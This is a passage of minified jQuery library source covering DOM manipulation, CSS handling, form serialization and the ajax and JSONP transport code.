            v.fn[e] = function (n, r) {
                var i = v.map(this, t, n);
                return nt.test(e) || (r = n), r && typeof r == "string" && (i = v.filter(r, i)), i = this.length > 1 && !ot[e] ? v.unique(i) : i, this.length > 1 && rt.test(e) && (i = i.reverse()), this.pushStack(i, e, l.call(arguments).join(","))
            }
        }), v.extend({
            filter: function (e, t, n) {
                return n && (e = ":not(" + e + ")"), t.length === 1 ? v.find.matchesSelector(t[0], e) ? [t[0]] : [] : v.find.matches(e, t)
            },
            dir: function (e, n, r) {
                var i = [],
                    s = e[n];
                while (s && s.nodeType !== 9 && (r === t || s.nodeType !== 1 || !v(s).is(r))) s.nodeType === 1 && i.push(s), s = s[n];
                return i
            },
            sibling: function (e, t) {
                var n = [];
                for (; e; e = e.nextSibling) e.nodeType === 1 && e !== t && n.push(e);
                return n
            }
        });
        var ct = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",
            ht = / jQuery\d+="(?:null|\d+)"/g,
            pt = /^\s+/,
            dt = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,
            vt = /<([\w:]+)/,
            mt = /<tbody/i,
            gt = /<|&#?\w+;/,
            yt = /<(?:script|style|link)/i,
            bt = /<(?:script|object|embed|option|style)/i,
            wt = new RegExp("<(?:" + ct + ")[\\s/>]", "i"),
            Et = /^(?:checkbox|radio)$/,
            St = /checked\s*(?:[^=]|=\s*.checked.)/i,
            xt = /\/(java|ecma)script/i,
            Tt = /^\s*<!(?:\[CDATA\[|\-\-)|[\]\-]{2}>\s*$/g,
            Nt = {
                option: [1, "<select multiple='multiple'>", "</select>"],
                legend: [1, "<fieldset>", "</fieldset>"],
                thead: [1, "<table>", "</table>"],
                tr: [2, "<table><tbody>", "</tbody></table>"],
                td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
                col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
                area: [1, "<map>", "</map>"],
                _default: [0, "", ""]
            }, Ct = lt(i),
            kt = Ct.appendChild(i.createElement("div"));
        Nt.optgroup = Nt.option, Nt.tbody = Nt.tfoot = Nt.colgroup = Nt.caption = Nt.thead, Nt.th = Nt.td, v.support.htmlSerialize || (Nt._default = [1, "X<div>", "</div>"]), v.fn.extend({
            text: function (e) {
                return v.access(this, function (e) {
                    return e === t ? v.text(this) : this.empty().append((this[0] && this[0].ownerDocument || i).createTextNode(e))
                }, null, e, arguments.length)
            },
            wrapAll: function (e) {
                if (v.isFunction(e)) return this.each(function (t) {
                    v(this).wrapAll(e.call(this, t))
                });
                if (this[0]) {
                    var t = v(e, this[0].ownerDocument).eq(0).clone(!0);
                    this[0].parentNode && t.insertBefore(this[0]), t.map(function () {
                        var e = this;
                        while (e.firstChild && e.firstChild.nodeType === 1) e = e.firstChild;
                        return e
                    }).append(this)
                }
                return this
            },
            wrapInner: function (e) {
                return v.isFunction(e) ? this.each(function (t) {
                    v(this).wrapInner(e.call(this, t))
                }) : this.each(function () {
                    var t = v(this),
                        n = t.contents();
                    n.length ? n.wrapAll(e) : t.append(e)
                })
            },
            wrap: function (e) {
                var t = v.isFunction(e);
                return this.each(function (n) {
                    v(this).wrapAll(t ? e.call(this, n) : e)
                })
            },
            unwrap: function () {
                return this.parent().each(function () {
                    v.nodeName(this, "body") || v(this).replaceWith(this.childNodes)
                }).end()
            },
            append: function () {
                return this.domManip(arguments, !0, function (e) {
                    (this.nodeType === 1 || this.nodeType === 11) && this.appendChild(e)
                })
            },
            prepend: function () {
                return this.domManip(arguments, !0, function (e) {
                    (this.nodeType === 1 || this.nodeType === 11) && this.insertBefore(e, this.firstChild)
                })
            },
            before: function () {
                if (!ut(this[0])) return this.domManip(arguments, !1, function (e) {
                    this.parentNode.insertBefore(e, this)
                });
                if (arguments.length) {
                    var e = v.clean(arguments);
                    return this.pushStack(v.merge(e, this), "before", this.selector)
                }
            },
            after: function () {
                if (!ut(this[0])) return this.domManip(arguments, !1, function (e) {
                    this.parentNode.insertBefore(e, this.nextSibling)
                });
                if (arguments.length) {
                    var e = v.clean(arguments);
                    return this.pushStack(v.merge(this, e), "after", this.selector)
                }
            },
            remove: function (e, t) {
                var n, r = 0;
                for (;
                    (n = this[r]) != null; r++)
                    if (!e || v.filter(e, [n]).length)!t && n.nodeType === 1 && (v.cleanData(n.getElementsByTagName("*")), v.cleanData([n])), n.parentNode && n.parentNode.removeChild(n);
                return this
            },
            empty: function () {
                var e, t = 0;
                for (;
                    (e = this[t]) != null; t++) {
                    e.nodeType === 1 && v.cleanData(e.getElementsByTagName("*"));
                    while (e.firstChild) e.removeChild(e.firstChild)
                }
                return this
            },
            clone: function (e, t) {
                return e = e == null ? !1 : e, t = t == null ? e : t, this.map(function () {
                    return v.clone(this, e, t)
                })
            },
            html: function (e) {
                return v.access(this, function (e) {
                    var n = this[0] || {}, r = 0,
                        i = this.length;
                    if (e === t) return n.nodeType === 1 ? n.innerHTML.replace(ht, "") : t;
                    if (typeof e == "string" && !yt.test(e) && (v.support.htmlSerialize || !wt.test(e)) && (v.support.leadingWhitespace || !pt.test(e)) && !Nt[(vt.exec(e) || ["", ""])[1].toLowerCase()]) {
                        e = e.replace(dt, "<$1></$2>");
                        try {
                            for (; r < i; r++) n = this[r] || {}, n.nodeType === 1 && (v.cleanData(n.getElementsByTagName("*")), n.innerHTML = e);
                            n = 0
                        } catch (s) {}
                    }
                    n && this.empty().append(e)
                }, null, e, arguments.length)
            },
            replaceWith: function (e) {
                return ut(this[0]) ? this.length ? this.pushStack(v(v.isFunction(e) ? e() : e), "replaceWith", e) : this : v.isFunction(e) ? this.each(function (t) {
                    var n = v(this),
                        r = n.html();
                    n.replaceWith(e.call(this, t, r))
                }) : (typeof e != "string" && (e = v(e).detach()), this.each(function () {
                    var t = this.nextSibling,
                        n = this.parentNode;
                    v(this).remove(), t ? v(t).before(e) : v(n).append(e)
                }))
            },
            detach: function (e) {
                return this.remove(e, !0)
            },
            domManip: function (e, n, r) {
                e = [].concat.apply([], e);
                var i, s, o, u, a = 0,
                    f = e[0],
                    l = [],
                    c = this.length;
                if (!v.support.checkClone && c > 1 && typeof f == "string" && St.test(f)) return this.each(function () {
                    v(this).domManip(e, n, r)
                });
                if (v.isFunction(f)) return this.each(function (i) {
                    var s = v(this);
                    e[0] = f.call(this, i, n ? s.html() : t), s.domManip(e, n, r)
                });
                if (this[0]) {
                    i = v.buildFragment(e, this, l), o = i.fragment, s = o.firstChild, o.childNodes.length === 1 && (o = s);
                    if (s) {
                        n = n && v.nodeName(s, "tr");
                        for (u = i.cacheable || c - 1; a < c; a++) r.call(n && v.nodeName(this[a], "table") ? Lt(this[a], "tbody") : this[a], a === u ? o : v.clone(o, !0, !0))
                    }
                    o = s = null, l.length && v.each(l, function (e, t) {
                        t.src ? v.ajax ? v.ajax({
                            url: t.src,
                            type: "GET",
                            dataType: "script",
                            async: !1,
                            global: !1,
                            "throws": !0
                        }) : v.error("no ajax") : v.globalEval((t.text || t.textContent || t.innerHTML || "").replace(Tt, "")), t.parentNode && t.parentNode.removeChild(t)
                    })
                }
                return this
            }
        }), v.buildFragment = function (e, n, r) {
            var s, o, u, a = e[0];
            return n = n || i, n = !n.nodeType && n[0] || n, n = n.ownerDocument || n, e.length === 1 && typeof a == "string" && a.length < 512 && n === i && a.charAt(0) === "<" && !bt.test(a) && (v.support.checkClone || !St.test(a)) && (v.support.html5Clone || !wt.test(a)) && (o = !0, s = v.fragments[a], u = s !== t), s || (s = n.createDocumentFragment(), v.clean(e, n, s, r), o && (v.fragments[a] = u && s)), {
                fragment: s,
                cacheable: o
            }
        }, v.fragments = {}, v.each({
            appendTo: "append",
            prependTo: "prepend",
            insertBefore: "before",
            insertAfter: "after",
            replaceAll: "replaceWith"
        }, function (e, t) {
            v.fn[e] = function (n) {
                var r, i = 0,
                    s = [],
                    o = v(n),
                    u = o.length,
                    a = this.length === 1 && this[0].parentNode;
                if ((a == null || a && a.nodeType === 11 && a.childNodes.length === 1) && u === 1) return o[t](this[0]), this;
                for (; i < u; i++) r = (i > 0 ? this.clone(!0) : this).get(), v(o[i])[t](r), s = s.concat(r);
                return this.pushStack(s, e, o.selector)
            }
        }), v.extend({
            clone: function (e, t, n) {
                var r, i, s, o;
                v.support.html5Clone || v.isXMLDoc(e) || !wt.test("<" + e.nodeName + ">") ? o = e.cloneNode(!0) : (kt.innerHTML = e.outerHTML, kt.removeChild(o = kt.firstChild));
                if ((!v.support.noCloneEvent || !v.support.noCloneChecked) && (e.nodeType === 1 || e.nodeType === 11) && !v.isXMLDoc(e)) {
                    Ot(e, o), r = Mt(e), i = Mt(o);
                    for (s = 0; r[s]; ++s) i[s] && Ot(r[s], i[s])
                }
                if (t) {
                    At(e, o);
                    if (n) {
                        r = Mt(e), i = Mt(o);
                        for (s = 0; r[s]; ++s) At(r[s], i[s])
                    }
                }
                return r = i = null, o
            },
            clean: function (e, t, n, r) {
                var s, o, u, a, f, l, c, h, p, d, m, g, y = t === i && Ct,
                    b = [];
                if (!t || typeof t.createDocumentFragment == "undefined") t = i;
                for (s = 0;
                    (u = e[s]) != null; s++) {
                    typeof u == "number" && (u += "");
                    if (!u) continue;
                    if (typeof u == "string")
                        if (!gt.test(u)) u = t.createTextNode(u);
                        else {
                            y = y || lt(t), c = t.createElement("div"), y.appendChild(c), u = u.replace(dt, "<$1></$2>"), a = (vt.exec(u) || ["", ""])[1].toLowerCase(), f = Nt[a] || Nt._default, l = f[0], c.innerHTML = f[1] + u + f[2];
                            while (l--) c = c.lastChild;
                            if (!v.support.tbody) {
                                h = mt.test(u), p = a === "table" && !h ? c.firstChild && c.firstChild.childNodes : f[1] === "<table>" && !h ? c.childNodes : [];
                                for (o = p.length - 1; o >= 0; --o) v.nodeName(p[o], "tbody") && !p[o].childNodes.length && p[o].parentNode.removeChild(p[o])
                            }!v.support.leadingWhitespace && pt.test(u) && c.insertBefore(t.createTextNode(pt.exec(u)[0]), c.firstChild), u = c.childNodes, c.parentNode.removeChild(c)
                        }
                    u.nodeType ? b.push(u) : v.merge(b, u)
                }
                c && (u = c = y = null);
                if (!v.support.appendChecked)
                    for (s = 0;
                        (u = b[s]) != null; s++) v.nodeName(u, "input") ? _t(u) : typeof u.getElementsByTagName != "undefined" && v.grep(u.getElementsByTagName("input"), _t);
                if (n) {
                    m = function (e) {
                        if (!e.type || xt.test(e.type)) return r ? r.push(e.parentNode ? e.parentNode.removeChild(e) : e) : n.appendChild(e)
                    };
                    for (s = 0;
                        (u = b[s]) != null; s++)
                        if (!v.nodeName(u, "script") || !m(u)) n.appendChild(u), typeof u.getElementsByTagName != "undefined" && (g = v.grep(v.merge([], u.getElementsByTagName("script")), m), b.splice.apply(b, [s + 1, 0].concat(g)), s += g.length)
                }
                return b
            },
            cleanData: function (e, t) {
                var n, r, i, s, o = 0,
                    u = v.expando,
                    a = v.cache,
                    f = v.support.deleteExpando,
                    l = v.event.special;
                for (;
                    (i = e[o]) != null; o++)
                    if (t || v.acceptData(i)) {
                        r = i[u], n = r && a[r];
                        if (n) {
                            if (n.events)
                                for (s in n.events) l[s] ? v.event.remove(i, s) : v.removeEvent(i, s, n.handle);
                            a[r] && (delete a[r], f ? delete i[u] : i.removeAttribute ? i.removeAttribute(u) : i[u] = null, v.deletedIds.push(r))
                        }
                    }
            }
        }),
        function () {
            var e, t;
            v.uaMatch = function (e) {
                e = e.toLowerCase();
                var t = /(chrome)[ \/]([\w.]+)/.exec(e) || /(webkit)[ \/]([\w.]+)/.exec(e) || /(opera)(?:.*version|)[ \/]([\w.]+)/.exec(e) || /(msie) ([\w.]+)/.exec(e) || e.indexOf("compatible") < 0 && /(mozilla)(?:.*? rv:([\w.]+)|)/.exec(e) || [];
                return {
                    browser: t[1] || "",
                    version: t[2] || "0"
                }
            }, e = v.uaMatch(o.userAgent), t = {}, e.browser && (t[e.browser] = !0, t.version = e.version), t.chrome ? t.webkit = !0 : t.webkit && (t.safari = !0), v.browser = t, v.sub = function () {
                function e(t, n) {
                    return new e.fn.init(t, n)
                }
                v.extend(!0, e, this), e.superclass = this, e.fn = e.prototype = this(), e.fn.constructor = e, e.sub = this.sub, e.fn.init = function (r, i) {
                    return i && i instanceof v && !(i instanceof e) && (i = e(i)), v.fn.init.call(this, r, i, t)
                }, e.fn.init.prototype = e.fn;
                var t = e(i);
                return e
            }
        }();
        var Dt, Pt, Ht, Bt = /alpha\([^)]*\)/i,
            jt = /opacity=([^)]*)/,
            Ft = /^(top|right|bottom|left)$/,
            It = /^(none|table(?!-c[ea]).+)/,
            qt = /^margin/,
            Rt = new RegExp("^(" + m + ")(.*)$", "i"),
            Ut = new RegExp("^(" + m + ")(?!px)[a-z%]+$", "i"),
            zt = new RegExp("^([-+])=(" + m + ")", "i"),
            Wt = {}, Xt = {
                position: "absolute",
                visibility: "hidden",
                display: "block"
            }, Vt = {
                letterSpacing: 0,
                fontWeight: 400
            }, $t = ["Top", "Right", "Bottom", "Left"],
            Jt = ["Webkit", "O", "Moz", "ms"],
            Kt = v.fn.toggle;
        v.fn.extend({
            css: function (e, n) {
                return v.access(this, function (e, n, r) {
                    return r !== t ? v.style(e, n, r) : v.css(e, n)
                }, e, n, arguments.length > 1)
            },
            show: function () {
                return Yt(this, !0)
            },
            hide: function () {
                return Yt(this)
            },
            toggle: function (e, t) {
                var n = typeof e == "boolean";
                return v.isFunction(e) && v.isFunction(t) ? Kt.apply(this, arguments) : this.each(function () {
                    (n ? e : Gt(this)) ? v(this).show() : v(this).hide()
                })
            }
        }), v.extend({
            cssHooks: {
                opacity: {
                    get: function (e, t) {
                        if (t) {
                            var n = Dt(e, "opacity");
                            return n === "" ? "1" : n
                        }
                    }
                }
            },
            cssNumber: {
                fillOpacity: !0,
                fontWeight: !0,
                lineHeight: !0,
                opacity: !0,
                orphans: !0,
                widows: !0,
                zIndex: !0,
                zoom: !0
            },
            cssProps: {
                "float": v.support.cssFloat ? "cssFloat" : "styleFloat"
            },
            style: function (e, n, r, i) {
                if (!e || e.nodeType === 3 || e.nodeType === 8 || !e.style) return;
                var s, o, u, a = v.camelCase(n),
                    f = e.style;
                n = v.cssProps[a] || (v.cssProps[a] = Qt(f, a)), u = v.cssHooks[n] || v.cssHooks[a];
                if (r === t) return u && "get" in u && (s = u.get(e, !1, i)) !== t ? s : f[n];
                o = typeof r, o === "string" && (s = zt.exec(r)) && (r = (s[1] + 1) * s[2] + parseFloat(v.css(e, n)), o = "number");
                if (r == null || o === "number" && isNaN(r)) return;
                o === "number" && !v.cssNumber[a] && (r += "px");
                if (!u || !("set" in u) || (r = u.set(e, r, i)) !== t) try {
                    f[n] = r
                } catch (l) {}
            },
            css: function (e, n, r, i) {
                var s, o, u, a = v.camelCase(n);
                return n = v.cssProps[a] || (v.cssProps[a] = Qt(e.style, a)), u = v.cssHooks[n] || v.cssHooks[a], u && "get" in u && (s = u.get(e, !0, i)), s === t && (s = Dt(e, n)), s === "normal" && n in Vt && (s = Vt[n]), r || i !== t ? (o = parseFloat(s), r || v.isNumeric(o) ? o || 0 : s) : s
            },
            swap: function (e, t, n) {
                var r, i, s = {};
                for (i in t) s[i] = e.style[i], e.style[i] = t[i];
                r = n.call(e);
                for (i in t) e.style[i] = s[i];
                return r
            }
        }), e.getComputedStyle ? Dt = function (t, n) {
            var r, i, s, o, u = e.getComputedStyle(t, null),
                a = t.style;
            return u && (r = u[n], r === "" && !v.contains(t.ownerDocument, t) && (r = v.style(t, n)), Ut.test(r) && qt.test(n) && (i = a.width, s = a.minWidth, o = a.maxWidth, a.minWidth = a.maxWidth = a.width = r, r = u.width, a.width = i, a.minWidth = s, a.maxWidth = o)), r
        } : i.documentElement.currentStyle && (Dt = function (e, t) {
            var n, r, i = e.currentStyle && e.currentStyle[t],
                s = e.style;
            return i == null && s && s[t] && (i = s[t]), Ut.test(i) && !Ft.test(t) && (n = s.left, r = e.runtimeStyle && e.runtimeStyle.left, r && (e.runtimeStyle.left = e.currentStyle.left), s.left = t === "fontSize" ? "1em" : i, i = s.pixelLeft + "px", s.left = n, r && (e.runtimeStyle.left = r)), i === "" ? "auto" : i
        }), v.each(["height", "width"], function (e, t) {
            v.cssHooks[t] = {
                get: function (e, n, r) {
                    if (n) return e.offsetWidth === 0 && It.test(Dt(e, "display")) ? v.swap(e, Xt, function () {
                        return tn(e, t, r)
                    }) : tn(e, t, r)
                },
                set: function (e, n, r) {
                    return Zt(e, n, r ? en(e, t, r, v.support.boxSizing && v.css(e, "boxSizing") === "border-box") : 0)
                }
            }
        }), v.support.opacity || (v.cssHooks.opacity = {
            get: function (e, t) {
                return jt.test((t && e.currentStyle ? e.currentStyle.filter : e.style.filter) || "") ? .01 * parseFloat(RegExp.$1) + "" : t ? "1" : ""
            },
            set: function (e, t) {
                var n = e.style,
                    r = e.currentStyle,
                    i = v.isNumeric(t) ? "alpha(opacity=" + t * 100 + ")" : "",
                    s = r && r.filter || n.filter || "";
                n.zoom = 1;
                if (t >= 1 && v.trim(s.replace(Bt, "")) === "" && n.removeAttribute) {
                    n.removeAttribute("filter");
                    if (r && !r.filter) return
                }
                n.filter = Bt.test(s) ? s.replace(Bt, i) : s + " " + i
            }
        }), v(function () {
            v.support.reliableMarginRight || (v.cssHooks.marginRight = {
                get: function (e, t) {
                    return v.swap(e, {
                        display: "inline-block"
                    }, function () {
                        if (t) return Dt(e, "marginRight")
                    })
                }
            }), !v.support.pixelPosition && v.fn.position && v.each(["top", "left"], function (e, t) {
                v.cssHooks[t] = {
                    get: function (e, n) {
                        if (n) {
                            var r = Dt(e, t);
                            return Ut.test(r) ? v(e).position()[t] + "px" : r
                        }
                    }
                }
            })
        }), v.expr && v.expr.filters && (v.expr.filters.hidden = function (e) {
            return e.offsetWidth === 0 && e.offsetHeight === 0 || !v.support.reliableHiddenOffsets && (e.style && e.style.display || Dt(e, "display")) === "none"
        }, v.expr.filters.visible = function (e) {
            return !v.expr.filters.hidden(e)
        }), v.each({
            margin: "",
            padding: "",
            border: "Width"
        }, function (e, t) {
            v.cssHooks[e + t] = {
                expand: function (n) {
                    var r, i = typeof n == "string" ? n.split(" ") : [n],
                        s = {};
                    for (r = 0; r < 4; r++) s[e + $t[r] + t] = i[r] || i[r - 2] || i[0];
                    return s
                }
            }, qt.test(e) || (v.cssHooks[e + t].set = Zt)
        });
        var rn = /%20/g,
            sn = /\[\]$/,
            on = /\r?\n/g,
            un = /^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,
            an = /^(?:select|textarea)/i;
        v.fn.extend({
            serialize: function () {
                return v.param(this.serializeArray())
            },
            serializeArray: function () {
                return this.map(function () {
                    return this.elements ? v.makeArray(this.elements) : this
                }).filter(function () {
                    return this.name && !this.disabled && (this.checked || an.test(this.nodeName) || un.test(this.type))
                }).map(function (e, t) {
                    var n = v(this).val();
                    return n == null ? null : v.isArray(n) ? v.map(n, function (e, n) {
                        return {
                            name: t.name,
                            value: e.replace(on, "\r\n")
                        }
                    }) : {
                        name: t.name,
                        value: n.replace(on, "\r\n")
                    }
                }).get()
            }
        }), v.param = function (e, n) {
            var r, i = [],
                s = function (e, t) {
                    t = v.isFunction(t) ? t() : t == null ? "" : t, i[i.length] = encodeURIComponent(e) + "=" + encodeURIComponent(t)
                };
            n === t && (n = v.ajaxSettings && v.ajaxSettings.traditional);
            if (v.isArray(e) || e.jquery && !v.isPlainObject(e)) v.each(e, function () {
                s(this.name, this.value)
            });
            else
                for (r in e) fn(r, e[r], n, s);
            return i.join("&").replace(rn, "+")
        };
        var ln, cn, hn = /#.*$/,
            pn = /^(.*?):[ \t]*([^\r\n]*)\r?$/mg,
            dn = /^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/,
            vn = /^(?:GET|HEAD)$/,
            mn = /^\/\//,
            gn = /\?/,
            yn = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
            bn = /([?&])_=[^&]*/,
            wn = /^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+)|)|)/,
            En = v.fn.load,
            Sn = {}, xn = {}, Tn = ["*/"] + ["*"];
        try {
            cn = s.href
        } catch (Nn) {
            cn = i.createElement("a"), cn.href = "", cn = cn.href
        }
        ln = wn.exec(cn.toLowerCase()) || [], v.fn.load = function (e, n, r) {
            if (typeof e != "string" && En) return En.apply(this, arguments);
            if (!this.length) return this;
            var i, s, o, u = this,
                a = e.indexOf(" ");
            return a >= 0 && (i = e.slice(a, e.length), e = e.slice(0, a)), v.isFunction(n) ? (r = n, n = t) : n && typeof n == "object" && (s = "POST"), v.ajax({
                url: e,
                type: s,
                dataType: "html",
                data: n,
                complete: function (e, t) {
                    r && u.each(r, o || [e.responseText, t, e])
                }
            }).done(function (e) {
                o = arguments, u.html(i ? v("<div>").append(e.replace(yn, "")).find(i) : e)
            }), this
        }, v.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "), function (e, t) {
            v.fn[t] = function (e) {
                return this.on(t, e)
            }
        }), v.each(["get", "post"], function (e, n) {
            v[n] = function (e, r, i, s) {
                return v.isFunction(r) && (s = s || i, i = r, r = t), v.ajax({
                    type: n,
                    url: e,
                    data: r,
                    success: i,
                    dataType: s
                })
            }
        }), v.extend({
            getScript: function (e, n) {
                return v.get(e, t, n, "script")
            },
            getJSON: function (e, t, n) {
                return v.get(e, t, n, "json")
            },
            ajaxSetup: function (e, t) {
                return t ? Ln(e, v.ajaxSettings) : (t = e, e = v.ajaxSettings), Ln(e, t), e
            },
            ajaxSettings: {
                url: cn,
                isLocal: dn.test(ln[1]),
                global: !0,
                type: "GET",
                contentType: "application/x-www-form-urlencoded; charset=UTF-8",
                processData: !0,
                async: !0,
                accepts: {
                    xml: "application/xml, text/xml",
                    html: "text/html",
                    text: "text/plain",
                    json: "application/json, text/javascript",
                    "*": Tn
                },
                contents: {
                    xml: /xml/,
                    html: /html/,
                    json: /json/
                },
                responseFields: {
                    xml: "responseXML",
                    text: "responseText"
                },
                converters: {
                    "* text": e.String,
                    "text html": !0,
                    "text json": v.parseJSON,
                    "text xml": v.parseXML
                },
                flatOptions: {
                    context: !0,
                    url: !0
                }
            },
            ajaxPrefilter: Cn(Sn),
            ajaxTransport: Cn(xn),
            ajax: function (e, n) {
                function T(e, n, s, a) {
                    var l, y, b, w, S, T = n;
                    if (E === 2) return;
                    E = 2, u && clearTimeout(u), o = t, i = a || "", x.readyState = e > 0 ? 4 : 0, s && (w = An(c, x, s));
                    if (e >= 200 && e < 300 || e === 304) c.ifModified && (S = x.getResponseHeader("Last-Modified"), S && (v.lastModified[r] = S), S = x.getResponseHeader("Etag"), S && (v.etag[r] = S)), e === 304 ? (T = "notmodified", l = !0) : (l = On(c, w), T = l.state, y = l.data, b = l.error, l = !b);
                    else {
                        b = T;
                        if (!T || e) T = "error", e < 0 && (e = 0)
                    }
                    x.status = e, x.statusText = (n || T) + "", l ? d.resolveWith(h, [y, T, x]) : d.rejectWith(h, [x, T, b]), x.statusCode(g), g = t, f && p.trigger("ajax" + (l ? "Success" : "Error"), [x, c, l ? y : b]), m.fireWith(h, [x, T]), f && (p.trigger("ajaxComplete", [x, c]), --v.active || v.event.trigger("ajaxStop"))
                }
                typeof e == "object" && (n = e, e = t), n = n || {};
                var r, i, s, o, u, a, f, l, c = v.ajaxSetup({}, n),
                    h = c.context || c,
                    p = h !== c && (h.nodeType || h instanceof v) ? v(h) : v.event,
                    d = v.Deferred(),
                    m = v.Callbacks("once memory"),
                    g = c.statusCode || {}, b = {}, w = {}, E = 0,
                    S = "canceled",
                    x = {
                        readyState: 0,
                        setRequestHeader: function (e, t) {
                            if (!E) {
                                var n = e.toLowerCase();
                                e = w[n] = w[n] || e, b[e] = t
                            }
                            return this
                        },
                        getAllResponseHeaders: function () {
                            return E === 2 ? i : null
                        },
                        getResponseHeader: function (e) {
                            var n;
                            if (E === 2) {
                                if (!s) {
                                    s = {};
                                    while (n = pn.exec(i)) s[n[1].toLowerCase()] = n[2]
                                }
                                n = s[e.toLowerCase()]
                            }
                            return n === t ? null : n
                        },
                        overrideMimeType: function (e) {
                            return E || (c.mimeType = e), this
                        },
                        abort: function (e) {
                            return e = e || S, o && o.abort(e), T(0, e), this
                        }
                    };
                d.promise(x), x.success = x.done, x.error = x.fail, x.complete = m.add, x.statusCode = function (e) {
                    if (e) {
                        var t;
                        if (E < 2)
                            for (t in e) g[t] = [g[t], e[t]];
                        else t = e[x.status], x.always(t)
                    }
                    return this
                }, c.url = ((e || c.url) + "").replace(hn, "").replace(mn, ln[1] + "//"), c.dataTypes = v.trim(c.dataType || "*").toLowerCase().split(y), c.crossDomain == null && (a = wn.exec(c.url.toLowerCase()) || !1, c.crossDomain = a && a.join(":") + (a[3] ? "" : a[1] === "http:" ? 80 : 443) !== ln.join(":") + (ln[3] ? "" : ln[1] === "http:" ? 80 : 443)), c.data && c.processData && typeof c.data != "string" && (c.data = v.param(c.data, c.traditional)), kn(Sn, c, n, x);
                if (E === 2) return x;
                f = c.global, c.type = c.type.toUpperCase(), c.hasContent = !vn.test(c.type), f && v.active++ === 0 && v.event.trigger("ajaxStart");
                if (!c.hasContent) {
                    c.data && (c.url += (gn.test(c.url) ? "&" : "?") + c.data, delete c.data), r = c.url;
                    if (c.cache === !1) {
                        var N = v.now(),
                            C = c.url.replace(bn, "$1_=" + N);
                        c.url = C + (C === c.url ? (gn.test(c.url) ? "&" : "?") + "_=" + N : "")
                    }
                }(c.data && c.hasContent && c.contentType !== !1 || n.contentType) && x.setRequestHeader("Content-Type", c.contentType), c.ifModified && (r = r || c.url, v.lastModified[r] && x.setRequestHeader("If-Modified-Since", v.lastModified[r]), v.etag[r] && x.setRequestHeader("If-None-Match", v.etag[r])), x.setRequestHeader("Accept", c.dataTypes[0] && c.accepts[c.dataTypes[0]] ? c.accepts[c.dataTypes[0]] + (c.dataTypes[0] !== "*" ? ", " + Tn + "; q=0.01" : "") : c.accepts["*"]);
                for (l in c.headers) x.setRequestHeader(l, c.headers[l]);
                if (!c.beforeSend || c.beforeSend.call(h, x, c) !== !1 && E !== 2) {
                    S = "abort";
                    for (l in {
                        success: 1,
                        error: 1,
                        complete: 1
                    }) x[l](c[l]);
                    o = kn(xn, c, n, x);
                    if (!o) T(-1, "No Transport");
                    else {
                        x.readyState = 1, f && p.trigger("ajaxSend", [x, c]), c.async && c.timeout > 0 && (u = setTimeout(function () {
                            x.abort("timeout")
                        }, c.timeout));
                        try {
                            E = 1, o.send(b, T)
                        } catch (k) {
                            if (!(E < 2)) throw k;
                            T(-1, k)
                        }
                    }
                    return x
                }
                return x.abort()
            },
            active: 0,
            lastModified: {},
            etag: {}
        });
        var Mn = [],
            _n = /\?/,
            Dn = /(=)\?(?=&|$)|\?\?/,
            Pn = v.now();
        v.ajaxSetup({
            jsonp: "callback",
            jsonpCallback: function () {
                var e = Mn.pop() || v.expando + "_" + Pn++;
                return this[e] = !0, e
            }
        }), v.ajaxPrefilter("json jsonp", function (n, r, i) {
            var s, o, u, a = n.data,
                f = n.url,
                l = n.jsonp !== !1,
                c = l && Dn.test(f),
                h = l && !c && typeof a == "string" && !(n.contentType || "").indexOf("application/x-www-form-urlencoded") && Dn.test(a);
            if (n.dataTypes[0] === "jsonp" || c || h) return s = n.jsonpCallback = v.isFunction(n.jsonpCallback) ? n.jsonpCallback() : n.jsonpCallback, o = e[s], c ? n.url = f.replace(Dn, "$1" + s) : h ? n.data = a.replace(Dn, "$1" + s) : l && (n.url += (_n.test(f) ? "&" : "?") + n.jsonp + "=" + s), n.converters["script json"] = function () {
                return u || v.error(s + " was not called"), u[0]
            }, n.dataTypes[0] = "json", e[s] = function () {
                u = arguments
            }, i.always(function () {
                e[s] = o, n[s] && (n.jsonpCallback = r.jsonpCallback, Mn.push(s)), u && v.isFunction(o) && o(u[0]), u = o = t
            }), "script"
        }), v.ajaxSetup({
            accepts: {
                script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
            },
            contents: {
                script: /javascript|ecmascript/
            },
            converters: {
                "text script": function (e) {
                    return v.globalEval(e), e
                }
            }
        }), v.ajaxPrefilter("script", function (e) {
            e.cache === t && (e.cache = !1), e.crossDomain && (e.type = "GET", e.global = !1)
        }), v.ajaxTransport("script", function (e) {
            if (e.crossDomain) {
                var n, r = i.head || i.getElementsByTagName("head")[0] || i.documentElement;
                return {
                    send: function (s, o) {
                        n = i.createElement("script"), n.async = "async", e.scriptCharset && (n.charset = e.scriptCharset), n.src = e.url, n.onload = n.onreadystatechange = function (e, i) {
                            if (i || !n.readyState || /loaded|complete/.test(n.readyState)) n.onload = n.onreadystatechange = null, r && n.parentNode && r.removeChild(n), n = t, i || o(200, "success")
                        }, r.insertBefore(n, r.firstChild)
                    },
                    abort: function () {
                        n && n.onload(0, 1)
                    }
                }
            }
        });
        var Hn, Bn = e.ActiveXObject ? function () {
                for (var e in Hn) Hn[e](0, 1)
            } : !1,
            jn = 0;
        v.ajaxSettings.xhr = e.ActiveXObject ? function () {
            return !this.isLocal && Fn() || In()
        } : Fn,
        function (e) {
            v.extend(v.support, {
                ajax: !! e,
                cors: !! e && "withCredentials" in e
            })
        }(v.ajaxSettings.xhr()), v.support.ajax && v.ajaxTransport(function (n) {
            if (!n.crossDomain || v.support.cors) {
                var r;
                return {
                    send: function (i, s) {
                        var o, u, a = n.xhr();
                        n.username ? a.open(n.type, n.url, n.async, n.username, n.password) : a.open(n.type, n.url, n.async);
                        if (n.xhrFields)
                            for (u in n.xhrFields) a[u] = n.xhrFields[u];
